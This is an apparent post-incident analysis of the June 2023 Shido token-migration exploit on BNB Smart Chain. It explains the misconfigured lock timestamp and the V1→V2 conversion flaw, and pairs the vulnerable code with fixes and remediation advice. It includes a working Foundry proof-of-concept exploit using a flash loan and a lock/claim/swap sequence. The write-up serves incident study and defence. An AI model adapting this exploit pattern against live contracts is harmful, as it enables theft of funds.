# Shido — Token Migration Lock/Claim Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-23 |
| **Protocol** | Shido (SHIDO Token — V1→V2 Migration) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$326,000 (~977 WBNB) |
| **Attacker EOA** | [0x6981...770d](https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d) |
| **Attack Contract** | [0xcdb3...a4cc](https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc) |
| **Vulnerable Contract (ShidoLock)** | [0xaF0C...F8D4](https://bscscan.com/address/0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4) |
| **Vulnerable Contract (SHIDO V2)** | [0xa963...B640](https://bscscan.com/address/0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640) |
| **Attack Tx** | [0x72f8...712d6](https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6) |
| **Attack Block** | 29,365,171 |
| **Root Cause** | Incorrect `lockTimestamp` configuration in the ShidoLock contract — a business logic flaw combining the V1→V2 conversion ratio with the token pool price discrepancy |
| **PoC Source** | [DeFiHackLabs — SHIDO_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp.sol) |
| **Analysis References** | [Phalcon_xyz](https://twitter.com/Phalcon_xyz/status/1672473343734480896) · [AnciliaInc](https://twitter.com/AnciliaInc/status/1672382613473083393) |

---

## 1. Vulnerability Overview

On June 23, 2023, the Shido protocol suffered approximately 977 WBNB (~$326,000) in losses due to a misconfiguration in the token migration contract (`ShidoLock`).

Shido operated a `ShidoLock` contract to support migration from the legacy token (ShidoInu, SHIDOINU — 9 decimal places) to the new standard token (SHIDO — 18 decimal places). This contract had two critical flaws:

1. **Incorrect `lockTimestamp` configuration**: The unlock time was set to the day of the attack (2023-06-23 14:00 UTC, timestamp `1687528800`), making the lock effectively bypassable immediately after deployment.

2. **Economic imbalance in the V1→V2 conversion ratio**: `claimTokens()` mints `10^9` V2 tokens per V1 token (decimal adjustment: 9→18 places). However, the significant market price difference between the two tokens (SHIDO V2 being far more expensive) meant that flash-loaning large quantities of cheap V1 tokens and converting them to V2 generated enormous profit.

The attacker exploited these flaws as follows:

1. Borrowed 40 WBNB via a DODO flash loan
2. Purchased a large amount of ShidoInu (V1) tokens on PancakeSwap with 39 WBNB
3. Provided a small amount of liquidity to `FeeFreeRouter` (to satisfy ShidoLock's balance check condition)
4. Called `ShidoLock.lockTokens()` → locked V1 tokens
5. Immediately called `ShidoLock.claimTokens()` → received `10^9` times the amount in V2 (SHIDO) tokens
6. Sold the received SHIDO V2 for WBNB on PancakeSwap
7. Repaid the flash loan and netted approximately 977 WBNB in profit

---

## 2. Vulnerable Code Analysis

### 2.1 Core Vulnerable Functions of the `ShidoLock` Contract

**Vulnerable code (`lockTokens`):**
```solidity
// ❌ Vulnerability: Lock mechanism deployed in an immediately bypassable state
// lockTimestamp = 1687528800 (2023-06-23 14:00 UTC) — set to the day of the attack

function lockTokens() external {
    // Lock the entire V1 token (ShidoInu, 9 decimals) balance
    uint256 amount = IERC20(shidoV1).balanceOf(msg.sender);
    if (amount == 0) revert ZeroAmount();

    // ❌ Issue: Records the user's V1 balance in state (in 9-decimal units)
    userShidoV1[msg.sender] += amount;

    // Transfer V1 tokens to rewardWallet
    IERC20(shidoV1).transferFrom(msg.sender, rewardWallet, amount);
}
```

**Vulnerable code (`claimTokens`):**
```solidity
// ❌ Vulnerability 1: lockTimestamp set to the attack day — claim is immediately available
// ❌ Vulnerability 2: V1 (9 decimals) → V2 (18 decimals) pays out 10^9 multiplier — market price imbalance not reflected

function claimTokens() external {
    // ❌ lockTimestamp = 1687528800 — already in the past on the day of the attack
    if (block.timestamp < lockTimestamp) revert WaitNotOver();

    // ❌ Core flaw: Multiplies V1 balance by 10^9 to pay out V2
    // V1 is 9 decimals, V2 is 18 decimals → simple decimal correction, but
    // creates arbitrage when the two tokens' market prices differ significantly
    uint256 amount = userShidoV1[msg.sender] * 10 ** 9;
    if (amount == 0) revert ZeroAmount();

    userShidoV1[msg.sender] = 0;     // Clear V1 balance
    userShidoV2[msg.sender] += amount;

    // ❌ Transfers V2 tokens directly from rewardWallet to msg.sender
    IERC20(shidoV2).transferFrom(rewardWallet, msg.sender, amount);
}
```

**Fixed code:**
```solidity
// ✅ Fix 1: Set lockTimestamp sufficiently in the future (e.g., 30 days after deployment)
// In the constructor:
// lockTimestamp = block.timestamp + 30 days;  // ✅ Ensures an adequate lock period

// ✅ Fix 2: Reflect market price ratio during V1→V2 conversion, or
//           allow only decimal correction while adding flash loan protection mechanisms

function claimTokens() external {
    // ✅ Sufficient future timestamp set relative to deployment time
    if (block.timestamp < lockTimestamp) revert WaitNotOver();

    uint256 v1Amount = userShidoV1[msg.sender];
    if (v1Amount == 0) revert ZeroAmount();

    // ✅ Track minimum lock duration elapsed per individual user
    if (block.timestamp < userLockTime[msg.sender] + MIN_LOCK_DURATION)
        revert LockPeriodNotOver();

    // ✅ Perform decimal correction only (market price ratio managed externally)
    uint256 v2Amount = v1Amount * 10 ** 9;

    userShidoV1[msg.sender] = 0;
    userShidoV2[msg.sender] += v2Amount;

    IERC20(shidoV2).transferFrom(rewardWallet, msg.sender, v2Amount);
}
```

---

### 2.2 Incorrect `lockTimestamp` Initialization

**Vulnerable configuration (inferred):**
```solidity
// ❌ Constructor hardcodes lockTimestamp to the deployment day (or the past)
constructor(
    address _shidoV1,
    address _shidoV2,
    address _rewardWallet
) {
    shidoV1 = _shidoV1;
    shidoV2 = _shidoV2;
    rewardWallet = _rewardWallet;

    // ❌ Core flaw: 2023-06-23 14:00 UTC (Unix timestamp)
    // Timestamp that expires immediately or within hours of deployment
    lockTimestamp = 1687528800;  // ❌ Incorrect hardcoded timestamp
}
```

**Fixed configuration:**
```solidity
// ✅ Set lock duration relative to deployment time
constructor(
    address _shidoV1,
    address _shidoV2,
    address _rewardWallet,
    uint256 _lockDurationDays  // ✅ Receive lock duration as a parameter
) {
    shidoV1 = _shidoV1;
    shidoV2 = _shidoV2;
    rewardWallet = _rewardWallet;

    // ✅ Expires after a sufficient period (e.g., 30 days) from deployment
    lockTimestamp = block.timestamp + (_lockDurationDays * 1 days);
}
```

---

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│  Attacker EOA: 0x6981...770d                             │
│  Attack Contract: 0xcdb3...a4cc                          │
│  Attack Block: 29,365,171 (BSC fork)                     │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 1] Borrow via DODO Flash Loan                     │
│  DPPAdvanced.flashLoan(40 WBNB, 0, attacker, data)       │
│  → DPPFlashLoanCall() callback executed                  │
│  40 WBNB borrowed                                        │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 2] WBNB → ShidoInu (V1) Swap                     │
│  PancakeRouter.swapExactTokensForTokens(39 WBNB)         │
│  → Receive large amount of SHIDOINU (V1) from            │
│    WBNB/ShidoInu pool                                    │
│  Recipient: FeeFreeRouter (prepared for liquidity add)   │
│  Additional: small amount of SHIDOINU worth 0.01 BNB     │
│    received directly                                     │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 3] Add Liquidity to FeeFreeRouter                 │
│  FeeFreeRouter.addLiquidityETH(SHIDOINU, 1e9, ...)       │
│  0.01 ETH + 1e9 SHIDOINU → receive LP tokens            │
│  Purpose: Establish a small position before calling      │
│           ShidoLock.lockTokens() to satisfy the          │
│           contract balance check condition               │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 4] ShidoLock — Lock V1 Tokens                    │
│  ShidoLock.lockTokens()                                  │
│  → Transfer all SHIDOINU (V1) from attack contract       │
│    to rewardWallet                                       │
│  → Record userShidoV1[attacker] = (V1 balance)          │
│  (in 9-decimal precision)                                │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 5] ShidoLock — Immediately Claim V2 Tokens        │
│           (Core Vulnerability)                           │
│  ShidoLock.claimTokens()                                 │
│  ❌ lockTimestamp = 1687528800 (already elapsed)         │
│  → block.timestamp >= lockTimestamp condition met        │
│    immediately                                           │
│  → amount = userShidoV1[attacker] * 10^9 computed       │
│  → Large SHIDO (V2) transfer from rewardWallet           │
│  V1 (9 decimals) small amount → V2 (18 decimals)        │
│    large amount received                                 │
│  + Market price: V2 >> V1 → enormous arbitrage profit   │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 6] Sell SHIDO (V2) → WBNB                        │
│  PancakeRouter.swapExactTokensForTokensSupportingFee(    │
│      SHIDO.balanceOf(attacker), 500e18, path, ...)       │
│  → Receive large amount of WBNB from SHIDO/WBNB pool    │
│  Total received: ~1,017 WBNB                            │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  [Step 7] Repay Flash Loan and Realize Profit            │
│  WBNB.transfer(DPPAdvanced, 40 WBNB)  [principal repay] │
│  Remaining ~977 WBNB → attacker net profit               │
│  → 1 BNB → Tornado Cash (begin laundering)              │
│  → 125 ETH → Tornado Cash (after bridging to Ethereum)  │
└──────────────────────────────────────────────────────────┘
```

---

## 4. PoC Code Excerpt (DeFiHackLabs — SHIDO_exp2.sol)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Summary - Total loss: ~977 WBNB
// @Attacker: https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d
// @Attack Contract: https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc
// @Attack Tx: https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6

interface IShidoLock {
    function lockTokens() external;   // Lock V1 tokens
    function claimTokens() external;  // Claim V2 tokens
}

contract ShidoTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 SHIDOInu = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);  // V1 (9 decimals)
    IERC20 SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);    // V2 (18 decimals)
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);  // DODO flash loan
    Uni_Router_V2 PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // FeeFreeRouter: Special fee-free router (used to bypass ShidoLock balance condition)
    Uni_Router_V2 FeeFreeRouter = Uni_Router_V2(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);

    function setUp() public {
        // Fork BSC just before the attack block (block 29,365,171)
        cheats.createSelectFork("bsc", 29_365_171);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] WBNB balance before attack", WBNB.balanceOf(address(this)), 18);

        // [Step 1] DODO flash loan: borrow 40 WBNB
        DPPAdvanced.flashLoan(40e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] WBNB balance after attack", WBNB.balanceOf(address(this)), 18);
        // Expected result: ~977 WBNB net profit
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,   // 40 WBNB
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        // Pre-approve
        WBNB.approve(address(PancakeRouter), type(uint256).max);
        SHIDOInu.approve(address(FeeFreeRouter), type(uint256).max);
        SHIDOInu.approve(address(ShidoLock), type(uint256).max);
        SHIDO.approve(address(PancakeRouter), type(uint256).max);

        // [Step 2] Buy large amount of ShidoInu (V1) with 39 WBNB
        // Recipient: FeeFreeRouter (prepared immediately before adding liquidity)
        swapWBNBToSHIDOInu(39e18, address(FeeFreeRouter));
        WBNB.withdraw(10e15);  // 0.01 BNB → convert to ETH (for liquidity provision)

        // Receive small amount of ShidoInu to own address (to satisfy balance condition)
        swapWBNBToSHIDOInu(100e15, address(this));

        // [Step 3] Add small amount of liquidity to FeeFreeRouter
        // In case ShidoLock.lockTokens() checks token balance of FeeFreeRouter
        FeeFreeRouter.addLiquidityETH{value: 0.01 ether}(
            address(SHIDOInu),
            1e9,           // Small amount of V1 tokens
            1, 1,
            address(this),
            block.timestamp + 100
        );

        // ─────────────────────────────────────────────
        // [Step 4] Core attack: lockTokens() → claimTokens()
        // ─────────────────────────────────────────────
        // lockTokens(): Lock entire V1 holdings → ShidoLock
        ShidoLock.lockTokens();

        // claimTokens(): lockTimestamp already elapsed → V2 claim available immediately!
        // V1 balance × 10^9 = V2 amount received (decimal 9→18 correction)
        // However, V2 market price >> V1 market price → enormous arbitrage profit
        ShidoLock.claimTokens();
        // ─────────────────────────────────────────────

        // [Step 5] Sell all received SHIDO (V2) → WBNB
        swapSHIDOToWBNB();

        // [Step 6] Repay flash loan principal (40 WBNB)
        WBNB.transfer(address(DPPAdvanced), baseAmount);
        // Remaining ~977 WBNB stays in attack contract → final profit
    }

    // WBNB → ShidoInu swap helper
    function swapWBNBToSHIDOInu(uint256 amountIn, address to) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHIDOInu);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 20, path, to, block.timestamp + 100
        );
    }

    // SHIDO (V2) → WBNB swap helper (sell entire balance)
    function swapSHIDOToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(SHIDO);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHIDO.balanceOf(address(this)),
            500e18,        // Minimum 500 WBNB guaranteed out
            path,
            address(this),
            block.timestamp + 100
        );
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Incorrect hardcoded `lockTimestamp` — immediately expirable lock period | CRITICAL | CWE-1038: Insecure Automated Optimizations / CWE-665: Improper Initialization |
| V-02 | V1→V2 conversion ratio does not reflect token price imbalance | CRITICAL | CWE-682: Incorrect Calculation |
| V-03 | Atomic lock/claim cycle combined with flash loan | HIGH | CWE-841: Improper Enforcement of Behavioral Workflow |
| V-04 | Unlimited V2 token approval from `rewardWallet` | MEDIUM | CWE-284: Improper Access Control |

### V-01: Incorrect `lockTimestamp` Initialization

- **Description**: The `lockTimestamp` of the `ShidoLock` contract was set to the deployment day (2023-06-23 14:00 UTC, Unix `1687528800`), making `claimTokens()` callable immediately after deployment. This is a configuration error resulting from a lack of pre-deployment parameter validation.
- **Impact**: The lock period was entirely ineffective, allowing an atomic attack (lock → claim in the same TX) immediately after locking.
- **Attack Condition**: Query contract parameters, confirm `lockTimestamp` is in the past relative to current time.

### V-02: Conversion Ratio Not Reflecting Market Price

- **Description**: `claimTokens()` pays out V2 by multiplying the V1 balance by `10^9`. This logic only corrects for the decimal place difference (9→18), but becomes economically unfair when the two tokens' actual market prices differ significantly. The attacker bought large amounts of cheap V1 and converted them to V2 to realize the price difference.
- **Impact**: The larger the price gap between V1 and V2 pools, the greater the achievable arbitrage; protocol's V2 token reserve drained.
- **Attack Condition**: Confirm V1/V2 price difference and access to flash loans.

### V-03: Flash Loan + Atomic Lock/Claim Attack

- **Description**: Within a single transaction, the entire sequence — buy V1 tokens → `lockTokens()` → `claimTokens()` → sell V2 tokens — can be executed atomically. With the lock period effectively nullified, a zero-cost attack combined with flash loans becomes possible.
- **Impact**: ~977 WBNB profit from a 40 WBNB investment within a single transaction.
- **Attack Condition**: V1 liquidity pool exists, flash loan access available, `lockTimestamp` already elapsed.

### V-04: Unlimited V2 Token Approval from `rewardWallet`

- **Description**: The `rewardWallet` had granted unlimited (`type(uint256).max`) V2 token transfer approval to the `ShidoLock` contract, and `claimTokens()` uses this approval to withdraw tokens directly from `rewardWallet`. A malicious caller can drain the entire V2 balance of `rewardWallet`.
- **Impact**: Complete drain of the protocol's V2 token reserve (`rewardWallet`) is possible.
- **Attack Condition**: Combined with V-01 and V-02 above.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Set lockTimestamp relative to deployment time
constructor(
    address _shidoV1,
    address _shidoV2,
    address _rewardWallet,
    uint256 _lockDurationSeconds  // ✅ Inject lock duration externally
) {
    shidoV1 = _shidoV1;
    shidoV2 = _shidoV2;
    rewardWallet = _rewardWallet;
    // ✅ Deployment time + explicit duration (e.g., 30 days = 2592000 seconds)
    lockTimestamp = block.timestamp + _lockDurationSeconds;
    require(_lockDurationSeconds >= 7 days, "Lock duration too short");
}
```

```solidity
// ✅ Fix 2: Track individual lock timestamps to prevent flash loan atomic attacks
mapping(address => uint256) public userLockTime;
uint256 public constant MIN_LOCK_DURATION = 1 days;  // Minimum lock period

function lockTokens() external {
    uint256 amount = IERC20(shidoV1).balanceOf(msg.sender);
    if (amount == 0) revert ZeroAmount();

    userShidoV1[msg.sender] += amount;
    // ✅ Record per-user lock time
    userLockTime[msg.sender] = block.timestamp;

    IERC20(shidoV1).transferFrom(msg.sender, rewardWallet, amount);
}

function claimTokens() external {
    if (block.timestamp < lockTimestamp) revert WaitNotOver();

    // ✅ Verify at least 1 day has elapsed since individual user's lock (prevents flash loan atomic attack)
    if (block.timestamp < userLockTime[msg.sender] + MIN_LOCK_DURATION)
        revert IndividualLockPeriodNotOver();

    uint256 amount = userShidoV1[msg.sender] * 10 ** 9;
    if (amount == 0) revert ZeroAmount();

    userShidoV1[msg.sender] = 0;
    userShidoV2[msg.sender] += amount;
    IERC20(shidoV2).transferFrom(rewardWallet, msg.sender, amount);
}
```

```solidity
// ✅ Fix 3: Set daily withdrawal limit for rewardWallet V2 tokens
uint256 public dailyClaimLimit;
uint256 public dailyClaimedAmount;
uint256 public lastClaimDay;

function claimTokens() external {
    // ... (include validation logic above)

    uint256 today = block.timestamp / 1 days;
    if (today != lastClaimDay) {
        dailyClaimedAmount = 0;  // ✅ New day → reset daily counter
        lastClaimDay = today;
    }

    uint256 v2Amount = userShidoV1[msg.sender] * 10 ** 9;

    // ✅ Prevent exceeding daily maximum withdrawal
    require(dailyClaimedAmount + v2Amount <= dailyClaimLimit, "Daily limit exceeded");
    dailyClaimedAmount += v2Amount;

    // ... (prior logic)
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Incorrect `lockTimestamp` configuration | Use `block.timestamp + duration` in constructor. Mandatory parameter audit before deployment. |
| Flash loan atomic attack | Record `lockTokens()` timestamp and add minimum 1-block (or 1-day) elapsed condition to `claimTokens()`. |
| Price imbalance not reflected | Dynamically adjust V1→V2 conversion ratio based on market TWAP price, or set a maximum conversion cap. |
| Unlimited `rewardWallet` approval | Set daily/weekly withdrawal limits and manage with multisig. |
| Contract pause mechanism | Implement emergency stop (`Pausable`) — halt `lockTokens`/`claimTokens` upon detecting anomalous patterns. |
| Pre-deployment validation | Write pre-deployment on-chain sanity check scripts for critical parameters such as timestamps and conversion ratios. |

---

## 7. Lessons Learned

1. **Deployment parameters are as critical as code**: This attack originated from a configuration error, not a code vulnerability per se. A single misconfigured parameter — `lockTimestamp` — rendered the entire lock mechanism ineffective. Constructor parameters and initialization values must undergo the same level of audit scrutiny as the code itself.

2. **Never hardcode lock periods as absolute timestamps**: Directly inputting a specific Unix timestamp such as `1687528800` can cause misalignment with the deployment time. Use relative calculations in the form of `block.timestamp + N days`, and have deployment scripts compute this automatically.

3. **Lock-and-Claim patterns must always account for atomic flash loan attacks**: Allowing `lockTokens()` and `claimTokens()` to be called within the same transaction enables zero-capital attacks when combined with flash loans. A minimum temporal separation of at least 1 block (or 1 day) must exist between locking and claiming.

4. **Always account for the market prices of both tokens during token migration**: A simple calculation that only corrects for decimal place differences during V1→V2 conversion creates severe arbitrage opportunities when the two tokens are priced differently. Reflect the price ratio using a TWAP oracle, or set a conversion cap.

5. **`rewardWallet` must follow the principle of least privilege**: Instead of granting unlimited approval to the migration contract, use limited approvals sized to the expected conversion volume and renew them periodically. Designing for automatic halt when limits are exceeded can contain damage.

6. **BSC's low gas costs make even simple attacks economically viable**: This attack had a straightforward structure — 40 WBNB flash loaned to extract 977 WBNB. On BSC, where gas costs are minimal, attacks with small capital causing large losses are significantly easier to execute.

---

## References

- [DeFiHackLabs PoC — SHIDO_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp.sol)
- [DeFiHackLabs PoC — SHIDO_exp2.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp2.sol)
- [Phalcon Analysis Tweet](https://twitter.com/Phalcon_xyz/status/1672473343734480896)
- [AnciliaInc Analysis Tweet](https://twitter.com/AnciliaInc/status/1672382613473083393)
- [Attack Transaction — BscScan](https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6)
- [ShidoLock Contract — BscScan](https://bscscan.com/address/0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4#code)
- [Attacker Address — BscScan](https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d)